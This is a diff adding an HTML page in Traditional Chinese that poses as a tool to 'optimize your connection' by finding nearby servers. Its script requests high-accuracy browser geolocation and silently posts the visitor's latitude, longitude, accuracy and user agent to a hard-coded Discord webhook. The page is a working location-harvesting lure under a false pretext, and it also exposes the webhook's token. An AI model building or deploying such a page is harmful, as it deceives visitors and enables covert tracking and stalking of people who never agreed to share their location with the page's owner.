@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡️ 快速定位測試</title>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #121212; color: white; margin: 0; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 80%; max-width: 400px; }
+        button { background: #5865F2; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; transition: 0.3s; width: 100%; margin-top: 20px; }
+        button:hover { background: #4752c4; }
+        #status { margin-top: 15px; font-size: 14px; color: #aaa; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>📍 尋找附近的伺服器</h2>
+    <p>點擊按鈕優化您的連線速度</p>
+    <button onclick="startProcess()">優化連線</button>
+    <div id="status">準備就緒</div>
+</div>
+
+<script>
+    // ⚠️ 請在這裡貼上你的 Discord Webhook 網址
+    const webhookURL = "https://discord.com/api/webhooks/1476593164885168248/PZwIM4LhlHk0J9qjA3MhZrGF7pQ476hc1ogUT347YA-hY_Oft0gikYEVpYRku2yf7O4p";
+
+    function startProcess() {
+        const status = document.getElementById('status');
+        status.innerText = "正在分析網路環境...";
+
+        if (!navigator.geolocation) {
+            status.innerText = "錯誤：瀏覽器不支援";
+            return;
+        }
+
+        // 觸發瀏覽器權限彈窗
+        navigator.geolocation.getCurrentPosition(success, error, {
+            enableHighAccuracy: true // 請求高精度定位
+        });
+    }
+
+    function success(position) {
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        const device = navigator.userAgent;
+
+        document.getElementById('status').innerText = "優化完成！";
+
+        // 🚀 關鍵：將資料發送到你的 Discord
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "📢 獲取到新的定位資訊！",
+                    color: 5814783,
+                    fields: [
+                        { name: "緯度 (Latitude)", value: `${lat}`, inline: true },
+                        { name: "經度 (Longitude)", value: `${lng}`, inline: true },
+                        { name: "誤差範圍", value: `${accuracy} 公尺`, inline: false },
+                        { name: "使用者設備", value: `\`\`\`${device}\`\`\`` }
+                    ],
+                    timestamp: new Date()
+                }]
+            })
+        });
+    }
+
+    function error(err) {
+        document.getElementById('status').innerText = "使用者拒絕了權限請求。";
+    }
+</script>
+
+</body>
+</html>
